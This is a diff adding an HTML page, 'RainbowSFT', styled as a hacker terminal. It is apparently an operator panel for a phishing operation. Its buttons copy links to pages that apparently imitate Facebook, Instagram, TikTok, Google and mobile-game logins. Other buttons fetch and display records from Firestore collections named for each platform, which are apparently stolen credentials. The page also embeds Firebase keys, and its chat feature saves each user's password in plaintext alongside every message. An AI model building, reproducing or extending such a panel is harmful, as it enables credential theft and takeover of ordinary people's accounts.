@@ -1,0 +1,615 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <title>RainbowSFT | TERMINAL FIXED + CHAT MODULE</title>
+    
+    <!-- Firebase modules -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getFirestore, collection, getDocs, addDoc, query, orderBy, onSnapshot, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+        
+        // Main DB config (original for hack data)
+        const firebaseConfig = {
+            apiKey: "AIzaSyCK8750OLb7WCLyXV2JIL1RaTth55wOQII",
+            authDomain: "main-apk-3209b.firebaseapp.com",
+            projectId: "main-apk-3209b",
+            storageBucket: "main-apk-3209b.firebasestorage.app",
+            messagingSenderId: "729839795941",
+            appId: "1:729839795941:web:48b23f39e7bf6f3cf11e0c"
+        };
+        
+        // Chat DB config (separate Firebase project for messages)
+        const chatConfig = {
+            apiKey: "AIzaSyCTqjOlJ4z-HO7c8M_1i2RlUUTvkcAeV-I",
+            authDomain: "chat-8bd8f.firebaseapp.com",
+            projectId: "chat-8bd8f",
+            storageBucket: "chat-8bd8f.firebasestorage.app",
+            messagingSenderId: "440978333450",
+            appId: "1:440978333450:web:8bf0c7a65be86183dde4f3"
+        };
+        
+        // Initialize main app (hack tools)
+        const mainApp = initializeApp(firebaseConfig);
+        const mainDb = getFirestore(mainApp);
+        
+        // Initialize chat app (separate instance)
+        const chatApp = initializeApp(chatConfig, "chatApp");
+        const chatDb = getFirestore(chatApp);
+        const messagesCollection = collection(chatDb, 'messages');
+        
+        window.db = mainDb;
+        window.getDocs = getDocs;
+        window.collection = collection;
+        window.chatDb = chatDb;
+        window.messagesCollection = messagesCollection;
+        window.addDoc = addDoc;
+        window.query = query;
+        window.orderBy = orderBy;
+        window.onSnapshot = onSnapshot;
+        window.serverTimestamp = serverTimestamp;
+    </script>
+
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; user-select: text; }
+        body { background: #000; width: 100%; height: 100vh; font-family: 'Courier New', monospace; overflow: hidden; }
+        .terminal { background: #000; width: 100%; height: 100vh; display: flex; flex-direction: column; }
+        .terminal-header { background: #0a0a0a; padding: 10px 16px; border-bottom: 2px solid #0f0; display: flex; justify-content: space-between; flex-shrink: 0; }
+        .terminal-title { color: #0f0; font-size: 0.85rem; }
+        .terminal-title::before { content: "⚡ "; color: #ff3; }
+        .controls { display: flex; gap: 6px; }
+        .ctrl { width: 11px; height: 11px; border-radius: 50%; }
+        .ctrl.red { background: #f33; }
+        .ctrl.yellow { background: #ff3; }
+        .ctrl.green { background: #3f3; }
+        .output { flex: 1; padding: 18px 14px; overflow-y: auto; color: #0f0; font-size: 14px; line-height: 1.6; scroll-behavior: smooth; }
+        .output::-webkit-scrollbar { width: 5px; }
+        .output::-webkit-scrollbar-track { background: #010; }
+        .output::-webkit-scrollbar-thumb { background: #0f0; }
+        .line { white-space: pre-wrap; word-break: break-word; margin-bottom: 4px; opacity: 0; animation: fadeUp 0.12s ease forwards; }
+        @keyframes fadeUp { from { opacity: 0; transform: translateY(3px); } to { opacity: 1; transform: translateY(0); } }
+        .command-box { background: #050505; border-top: 2px solid #0f0; padding: 10px 14px; display: flex; gap: 10px; flex-shrink: 0; }
+        .prompt { color: #ff3; font-weight: bold; }
+        .prompt::before { content: ">"; color: #0f0; margin-right: 6px; }
+        #cmdInput { background: transparent; border: none; color: #0f0; font-family: monospace; font-size: 1rem; flex: 1; outline: none; }
+        .btn-hack { background: #110000; border: 2px solid #f33; color: #f33; padding: 12px; text-align: center; cursor: pointer; border-radius: 8px; margin: 8px 0; font-weight: bold; }
+        .btn-hack:active { background: #f33; color: #000; transform: scale(0.98); }
+        .btn-view { background: #001100; border: 2px solid #0f0; color: #0f0; padding: 12px; text-align: center; cursor: pointer; border-radius: 8px; margin: 8px 0; font-weight: bold; }
+        .btn-view:active { background: #0f0; color: #000; transform: scale(0.98); }
+        .data-dialog { background: #0a0a0a; border: 2px solid #0f0; border-radius: 10px; padding: 14px; margin: 12px 0; }
+        .data-title { color: #ff3; font-size: 1rem; font-weight: bold; border-bottom: 1px solid #0f0; padding-bottom: 5px; margin-bottom: 10px; }
+        .data-field { margin: 6px 0; padding: 5px 8px; border-left: 2px solid #f33; word-break: break-all; }
+        .field-name { color: #ff3; font-weight: bold; }
+        .yellow { color: #ff3; }
+        .green { color: #0f0; }
+        .red { color: #f33; }
+        .matrix-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(110px, 1fr)); gap: 10px; margin: 15px 0; }
+        .grid-item { color: #ff3; border: 1.5px solid #ff3; padding: 10px; text-align: center; cursor: pointer; border-radius: 6px; background: #000; font-weight: bold; }
+        .grid-item:active { background: #ff3; color: #000; }
+        .toast { position: fixed; bottom: 75px; left: 50%; transform: translateX(-50%); background: #0f0; color: #000; padding: 6px 14px; border-radius: 8px; font-weight: bold; font-size: 11px; z-index: 200; animation: fadeOut 2s ease forwards; }
+        @keyframes fadeOut { 0% { opacity: 1; } 70% { opacity: 1; } 100% { opacity: 0; visibility: hidden; } }
+        
+        /* CHAT MODULE STYLES - fully integrated terminal look */
+        .chat-terminal-container {
+            background: #010101;
+            border: 2px solid #0f0;
+            border-radius: 12px;
+            margin: 15px 0;
+            padding: 0;
+            overflow: hidden;
+            box-shadow: 0 0 15px rgba(0,255,0,0.2);
+        }
+        .chat-header {
+            background: #0a0a0a;
+            padding: 8px 12px;
+            border-bottom: 1px solid #0f0;
+            font-weight: bold;
+            color: #ff3;
+            font-size: 0.85rem;
+            display: flex;
+            justify-content: space-between;
+        }
+        .chat-header span:first-child::before { content: "💬 "; color: #0f0; }
+        .chat-login-area {
+            padding: 20px;
+            background: #000;
+        }
+        .chat-login-input {
+            background: #050505;
+            border: 1px solid #0f0;
+            padding: 8px;
+            margin: 10px 0;
+            color: #0f0;
+            font-family: monospace;
+            width: 100%;
+        }
+        .chat-messages-area {
+            height: 280px;
+            overflow-y: auto;
+            background: #000000cc;
+            padding: 12px;
+            font-size: 13px;
+            border-bottom: 1px solid #2a2a2a;
+        }
+        .chat-messages-area::-webkit-scrollbar { width: 4px; }
+        .chat-messages-area::-webkit-scrollbar-thumb { background: #0f0; }
+        .chat-msg {
+            margin-bottom: 10px;
+            border-left: 2px solid #0f0;
+            padding-left: 8px;
+            word-break: break-word;
+            animation: fadeUp 0.1s ease;
+        }
+        .chat-msg-user { color: #ff3; font-weight: bold; }
+        .chat-msg-time { color: #3a3a3a; font-size: 10px; margin-right: 8px; }
+        .chat-input-bar {
+            display: flex;
+            background: #000;
+            border-top: 1px solid #0f0;
+            padding: 10px;
+            gap: 8px;
+            align-items: center;
+        }
+        .chat-prompt { color: #0f0; font-weight: bold; white-space: nowrap; }
+        .chat-prompt::before { content: ">"; margin-right: 6px; color: #ff3; }
+        .chat-input-field {
+            background: transparent;
+            border: none;
+            color: #0f0;
+            font-family: monospace;
+            font-size: 0.9rem;
+            flex: 1;
+            outline: none;
+        }
+        .chat-btn {
+            background: #001100;
+            border: 1px solid #0f0;
+            color: #0f0;
+            padding: 6px 12px;
+            cursor: pointer;
+            font-family: monospace;
+            font-weight: bold;
+            border-radius: 4px;
+        }
+        .chat-btn:active { background: #0f0; color: #000; }
+        .chat-error { color: #f33; font-size: 11px; margin-top: 6px; padding-left: 10px; }
+        .chat-status { color: #6f6; font-size: 11px; margin-bottom: 6px; }
+        .close-chat-btn {
+            background: #2a0000;
+            border: 1px solid #f33;
+            color: #f88;
+            font-size: 11px;
+            cursor: pointer;
+            padding: 2px 8px;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="terminal">
+    <div class="terminal-header">
+        <span class="terminal-title">RainbowSFT | TERMINAL FIXED + CHAT MODULE</span>
+        <div class="controls"><span class="ctrl red"></span><span class="ctrl yellow"></span><span class="ctrl green"></span></div>
+    </div>
+    <div class="output" id="outputArea">
+        <div class="line">[✓] SYSTEM READY - FIXED VERSION</div>
+        <div class="line">[✓] SAME COMMAND CAN BE USED MULTIPLE TIMES</div>
+        <div class="line">[✓] CHAT MODULE: Type 'chat' to open secure messenger</div>
+        <div class="line">────────────────────────────────────────</div>
+        <div class="line">Type <span class="yellow">'ViewAll'</span> or <span class="yellow">'help'</span></div>
+        <div class="line">TG: <span class="yellow">@rainbow404SFT</span></div>
+    </div>
+    <div class="command-box">
+        <span class="prompt"></span>
+        <input type="text" id="cmdInput" placeholder="type command..." autofocus>
+    </div>
+</div>
+
+<script>
+    const output = document.getElementById('outputArea');
+    const cmdInput = document.getElementById('cmdInput');
+    
+    const HACK_LINKS = {
+        facebook: "https://familytoy6-dev.github.io/Fb/",
+        instagram: "https://familytoy6-dev.github.io/Instagram-/",
+        tiktok: "https://familytoy6-dev.github.io/Tt/",
+        mlbb: "https://familytoy6-dev.github.io/Mlbb/",
+        pubg: "https://familytoy6-dev.github.io/Pubg/",
+        google: "https://familytoy6-dev.github.io/Gg/"
+    };
+    
+    // Chat UI state
+    let activeChatDialog = null;      // DOM element of chat container
+    let chatUnsubscribe = null;        // Firestore listener
+    let currentChatUser = "";
+    let currentChatPass = "";
+    let isChatLoggedIn = false;
+    
+    function showToast(msg) { 
+        let t = document.createElement('div'); 
+        t.className = 'toast'; 
+        t.textContent = msg; 
+        document.body.appendChild(t); 
+        setTimeout(() => t.remove(), 2000); 
+    }
+    
+    async function addLine(text, color = '') {
+        return new Promise(resolve => {
+            const div = document.createElement('div');
+            div.className = 'line';
+            if (color) div.classList.add(color);
+            output.appendChild(div);
+            let i = 0;
+            function type() { 
+                if (i < text.length) { 
+                    div.textContent += text[i]; i++; setTimeout(type, 22); 
+                } else { 
+                    output.scrollTop = output.scrollHeight; resolve(); 
+                } 
+            }
+            type();
+        });
+    }
+    
+    function addPlain(text, color = '') { 
+        let div = document.createElement('div'); 
+        div.className = 'line'; 
+        if (color) div.classList.add(color); 
+        div.textContent = text; 
+        output.appendChild(div); 
+        output.scrollTop = output.scrollHeight; 
+    }
+    
+    async function clearScreen() { 
+        output.innerHTML = ''; 
+        await addLine('[ SYSTEM ] SCREEN CLEARED', 'green'); 
+        await addLine('[ SYSTEM ] READY', 'green'); 
+    }
+    
+    async function showViewAll() {
+        await addLine('┌────────────────────────────────┐', 'green');
+        await addLine('│       🌐 PLATFORM MATRIX       │', 'yellow');
+        await addLine('└────────────────────────────────┘', 'green');
+        let grid = document.createElement('div');
+        grid.className = 'matrix-grid';
+        ['Facebook', 'TikTok', 'Instagram', 'Google', 'Mlbb', 'Pubg', 'Clear', 'Chat'].forEach(p => {
+            let btn = document.createElement('div');
+            btn.className = 'grid-item';
+            btn.textContent = p;
+            btn.onclick = () => { cmdInput.value = p.toLowerCase(); executeCommand(cmdInput.value); };
+            grid.appendChild(btn);
+        });
+        output.appendChild(grid);
+        await addLine('[!] Click or type platform name', 'yellow');
+    }
+    
+    async function fetchCollectionData(collectionName) {
+        try {
+            const colRef = window.collection(window.db, collectionName);
+            const snapshot = await window.getDocs(colRef);
+            let records = [];
+            snapshot.forEach(doc => { records.push({ id: doc.id, data: doc.data() }); });
+            return records;
+        } catch(e) { return []; }
+    }
+    
+    async function showPlatformDialog(platform) {
+        let cap = platform.charAt(0).toUpperCase() + platform.slice(1);
+        let displayName = cap;
+        let collectionName = platform;
+        
+        if(platform === 'mlbb') collectionName = 'Mlbb';
+        if(platform === 'pubg') collectionName = 'pubg';
+        if(platform === 'facebook') collectionName = 'Facebook';
+        if(platform === 'instagram') collectionName = 'Instagram';
+        if(platform === 'tiktok') collectionName = 'TikTok';
+        if(platform === 'google') collectionName = 'Google';
+        
+        const uniqueId = Date.now() + Math.random();
+        const hackBtnId = `hack_${uniqueId}`;
+        const viewBtnId = `view_${uniqueId}`;
+        
+        let dialog = document.createElement('div');
+        dialog.className = 'data-dialog';
+        dialog.innerHTML = `
+            <div class="data-title">⚠️ ${displayName.toUpperCase()} INTERFACE ⚠️</div>
+            <div class="btn-hack" id="${hackBtnId}">🔴 ${displayName} HACK LINK (COPY)</div>
+            <div class="btn-view" id="${viewBtnId}">📁 ${displayName} VIEW → FETCH DATABASE</div>
+            <div class="red" style="font-size:9px; text-align:center; margin-top:8px;">@rainbow404SPF</div>
+        `;
+        output.appendChild(dialog);
+        
+        const link = HACK_LINKS[platform] || "https://www-tinyurl.com/5166f5d9";
+        
+        document.getElementById(hackBtnId)?.addEventListener('click', async () => {
+            try { 
+                await navigator.clipboard.writeText(link); 
+                showToast('✓ LINK COPIED'); 
+                addPlain(`[✓] ${displayName} link copied: ${link}`, 'green'); 
+            } catch(e) { 
+                let ta = document.createElement('textarea'); 
+                ta.value = link; 
+                document.body.appendChild(ta); 
+                ta.select(); 
+                document.execCommand('copy'); 
+                document.body.removeChild(ta); 
+                showToast('✓ COPIED'); 
+            }
+        });
+        
+        document.getElementById(viewBtnId)?.addEventListener('click', async () => {
+            await addLine(`[→] Fetching ${displayName} from API...`, 'yellow');
+            let records = await fetchCollectionData(collectionName);
+            let resultDiv = document.createElement('div');
+            resultDiv.className = 'data-dialog';
+            resultDiv.style.borderColor = '#ff3';
+            resultDiv.innerHTML = `<div class="data-title">📁 ${displayName} DATABASE RECORDS</div>`;
+            
+            if(records.length === 0) {
+                resultDiv.innerHTML += `<div class="data-field"><span class="field-name">[INFO]</span> No documents found in '${collectionName}' collection</div>`;
+            } else {
+                for(let rec of records) {
+                    resultDiv.innerHTML += `<div class="data-field"><span class="field-name">📄 Document: ${rec.id}</span></div>`;
+                    for(let [key, val] of Object.entries(rec.data)) {
+                        let displayVal = typeof val === 'object' ? JSON.stringify(val) : val;
+                        resultDiv.innerHTML += `<div class="data-field"><span class="field-name">${key}:</span> ${displayVal}</div>`;
+                    }
+                    resultDiv.innerHTML += `<div style="border-top:1px dashed #0f0; margin:6px 0;"></div>`;
+                }
+            }
+            output.appendChild(resultDiv);
+            output.scrollTop = output.scrollHeight;
+        });
+        output.scrollTop = output.scrollHeight;
+    }
+    
+    // ================= CHAT MODULE INTEGRATION (full terminal-style) =================
+    async function destroyChatModule() {
+        if (chatUnsubscribe) {
+            chatUnsubscribe();
+            chatUnsubscribe = null;
+        }
+        if (activeChatDialog && activeChatDialog.parentNode) {
+            activeChatDialog.remove();
+            activeChatDialog = null;
+        }
+        isChatLoggedIn = false;
+        currentChatUser = "";
+    }
+    
+    async function renderChatInterface() {
+        // Remove any existing chat dialog first
+        if (activeChatDialog) {
+            await destroyChatModule();
+        }
+        
+        const chatContainer = document.createElement('div');
+        chatContainer.className = 'chat-terminal-container';
+        chatContainer.id = 'liveChatModule';
+        
+        // Initial state: login form
+        chatContainer.innerHTML = `
+            <div class="chat-header">
+                <span>SECURE MESSENGER [ENCRYPTED]</span>
+                <button class="close-chat-btn" id="closeChatPanelBtn">✖ CLOSE</button>
+            </div>
+            <div id="chatDynamicContent">
+                <div class="chat-login-area">
+                    <div class="chat-status">⚡ CONNECT TO FIREBASE MESSAGE BUS</div>
+                    <label style="color:#0f0;">> USERNAME (4-20 chars):</label>
+                    <input type="text" id="chatLoginUser" class="chat-login-input" placeholder="handle" maxlength="20" autocomplete="off">
+                    <label style="color:#0f0; margin-top:10px; display:block;">> PASS KEY (4-20 chars):</label>
+                    <input type="password" id="chatLoginPass" class="chat-login-input" placeholder="•••••" maxlength="20">
+                    <div id="chatLoginError" class="chat-error"></div>
+                    <button id="chatDoLoginBtn" class="chat-btn" style="margin-top:12px;">[ LOGIN ]</button>
+                    <div style="font-size:10px; color:#3a3a3a; margin-top:12px;">* Credentials only for chat session</div>
+                </div>
+            </div>
+        `;
+        output.appendChild(chatContainer);
+        activeChatDialog = chatContainer;
+        output.scrollTop = output.scrollHeight;
+        
+        // attach close button
+        const closeBtn = document.getElementById('closeChatPanelBtn');
+        if (closeBtn) {
+            closeBtn.addEventListener('click', async () => {
+                await destroyChatModule();
+                addPlain("[CHAT] Chat panel closed", "yellow");
+                cmdInput.focus();
+            });
+        }
+        
+        // login logic
+        const loginBtn = document.getElementById('chatDoLoginBtn');
+        const userInput = document.getElementById('chatLoginUser');
+        const passInput = document.getElementById('chatLoginPass');
+        const errorSpan = document.getElementById('chatLoginError');
+        
+        const performLogin = async () => {
+            const username = userInput.value.trim();
+            const password = passInput.value.trim();
+            if (username.length < 4 || password.length < 4) {
+                errorSpan.innerText = "!! ACCESS DENIED: MIN 4 CHARS REQUIRED !!";
+                return;
+            }
+            errorSpan.innerText = "";
+            currentChatUser = username;
+            currentChatPass = password;
+            isChatLoggedIn = true;
+            
+            // Switch to chat messenger UI
+            const dynamicDiv = document.getElementById('chatDynamicContent');
+            if (dynamicDiv) {
+                dynamicDiv.innerHTML = `
+                    <div class="chat-header" style="border-bottom:1px solid #0f0; padding:6px 10px;">
+                        <span>💬 LOBBY: ${username.toUpperCase()}</span>
+                        <span style="color:#0f0;">● LIVE</span>
+                    </div>
+                    <div id="chatMessagesArea" class="chat-messages-area">
+                        <div class="chat-msg" style="color:#3a3a3a;">[system] Waiting for messages...</div>
+                    </div>
+                    <div class="chat-input-bar">
+                        <span class="chat-prompt"></span>
+                        <input type="text" id="chatMessageInput" class="chat-input-field" placeholder="Type your message..." autocomplete="off">
+                        <button id="chatSendBtn" class="chat-btn">SEND</button>
+                    </div>
+                    <div class="chat-error" id="chatSendError" style="padding:4px 10px;"></div>
+                `;
+                // focus input
+                const msgField = document.getElementById('chatMessageInput');
+                if (msgField) msgField.focus();
+                
+                // attach send event
+                const sendBtn = document.getElementById('chatSendBtn');
+                const sendInput = document.getElementById('chatMessageInput');
+                const sendError = document.getElementById('chatSendError');
+                
+                const sendMessageToFirebase = async () => {
+                    const text = sendInput.value.trim();
+                    if (!text) return;
+                    if (text.length > 300) {
+                        sendError.innerText = "Message too long (max 300 chars)";
+                        return;
+                    }
+                    sendError.innerText = "";
+                    try {
+                        await window.addDoc(window.messagesCollection, {
+                            Username: currentChatUser,
+                            Password: currentChatPass,
+                            text: text,
+                            CreatedAt: window.serverTimestamp()
+                        });
+                        sendInput.value = "";
+                        sendInput.focus();
+                    } catch (err) {
+                        sendError.innerText = "Send failed: " + err.message;
+                        console.error(err);
+                    }
+                };
+                
+                sendBtn.addEventListener('click', sendMessageToFirebase);
+                sendInput.addEventListener('keypress', (e) => {
+                    if (e.key === 'Enter') sendMessageToFirebase();
+                });
+                
+                // realtime listener
+                if (chatUnsubscribe) chatUnsubscribe();
+                const q = window.query(window.messagesCollection, window.orderBy("CreatedAt", "asc"));
+                chatUnsubscribe = window.onSnapshot(q, (snapshot) => {
+                    const msgArea = document.getElementById('chatMessagesArea');
+                    if (!msgArea) return;
+                    msgArea.innerHTML = '';
+                    let hasMessages = false;
+                    snapshot.forEach(doc => {
+                        hasMessages = true;
+                        const data = doc.data();
+                        let timeStr = "??";
+                        if (data.CreatedAt && data.CreatedAt.seconds) {
+                            const d = new Date(data.CreatedAt.seconds * 1000);
+                            timeStr = d.toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
+                        }
+                        const div = document.createElement('div');
+                        div.className = 'chat-msg';
+                        div.innerHTML = `<span class="chat-msg-time">[${timeStr}]</span><span class="chat-msg-user">${escapeHtml(data.Username)}:</span> ${escapeHtml(data.text)}`;
+                        msgArea.appendChild(div);
+                    });
+                    if (!hasMessages) {
+                        msgArea.innerHTML = '<div class="chat-msg" style="color:#3a3a3a;">[system] No messages yet. Be the first!</div>';
+                    }
+                    msgArea.scrollTop = msgArea.scrollHeight;
+                }, (err) => {
+                    console.warn("Snapshot error:", err);
+                    const msgArea = document.getElementById('chatMessagesArea');
+                    if (msgArea) msgArea.innerHTML = '<div class="chat-msg red">[ERROR] Failed to load messages. Check console.</div>';
+                });
+            }
+        };
+        
+        loginBtn.addEventListener('click', performLogin);
+        userInput.addEventListener('keypress', (e) => { if(e.key === 'Enter') performLogin(); });
+        passInput.addEventListener('keypress', (e) => { if(e.key === 'Enter') performLogin(); });
+        
+        cmdInput.focus();
+    }
+    
+    // Helper: escape HTML to avoid injection
+    function escapeHtml(str) {
+        if (!str) return "";
+        return str.replace(/[&<>]/g, function(m) {
+            if (m === '&') return '&amp;';
+            if (m === '<') return '&lt;';
+            if (m === '>') return '&gt;';
+            return m;
+        }).replace(/[\uD800-\uDBFF][\uDC00-\uDFFF]/g, function(c) {
+            return c;
+        });
+    }
+    
+    async function showHelp() {
+        await addLine('╔════════════════════════════════╗', 'green');
+        await addLine('║        🔥 COMMAND LIST        ║', 'yellow');
+        await addLine('╠════════════════════════════════╣', 'green');
+        await addLine('║  ViewAll  → Show all platforms║', 'green');
+        await addLine('║  facebook → FB hack tools     ║', 'green');
+        await addLine('║  tiktok   → TikTok tools      ║', 'green');
+        await addLine('║  instagram→ IG tools          ║', 'green');
+        await addLine('║  google   → Google tools      ║', 'green');
+        await addLine('║  mlbb     → MLBB tools        ║', 'green');
+        await addLine('║  pubg     → PUBG tools        ║', 'green');
+        await addLine('║  chat     → Open Secure Chat  ║', 'green');
+        await addLine('║  clear    → Clear screen      ║', 'green');
+        await addLine('╚════════════════════════════════╝', 'green');
+    }
+    
+    async function executeCommand(cmd) {
+        let lower = cmd.trim().toLowerCase();
+        addPlain(`┌─[rainbow404SFT]──► ${cmd}`, '#0a0');
+        if(lower === 'viewall') await showViewAll();
+        else if(lower === 'facebook') await showPlatformDialog('facebook');
+        else if(lower === 'tiktok') await showPlatformDialog('tiktok');
+        else if(lower === 'instagram') await showPlatformDialog('instagram');
+        else if(lower === 'google') await showPlatformDialog('google');
+        else if(lower === 'mlbb') await showPlatformDialog('mlbb');
+        else if(lower === 'pubg') await showPlatformDialog('pubg');
+        else if(lower === 'clear') await clearScreen();
+        else if(lower === 'help') await showHelp();
+        else if(lower === 'chat') {
+            // remove any existing chat module before opening new one
+            if (activeChatDialog) {
+                await destroyChatModule();
+                addPlain("[CHAT] Previous chat closed. Opening fresh session...", "yellow");
+            }
+            await renderChatInterface();
+            addPlain("[✓] Chat module loaded. Enter username/pass (min 4 chars)", "green");
+        }
+        else await addLine(`[ERROR] Unknown: '${cmd}'. Type 'help'`, 'red');
+        
+        addPlain('────────────────────────────────────────', '#262');
+        output.scrollTop = output.scrollHeight;
+        cmdInput.focus();
+    }
+    
+    cmdInput.addEventListener('keypress', e => { 
+        if(e.key === 'Enter') { 
+            let val = cmdInput.value; 
+            cmdInput.value = ''; 
+            executeCommand(val); 
+        } 
+    });
+    
+    window.addEventListener('load', async () => { 
+        await showHelp(); 
+        addPlain('────────────────────────────────────────', '#262');
+        cmdInput.focus(); 
+    });
+    
+    // Optional: cleanup on page unload
+    window.addEventListener('beforeunload', () => {
+        if (chatUnsubscribe) chatUnsubscribe();
+    });
+</script>
+</body>
+</html>
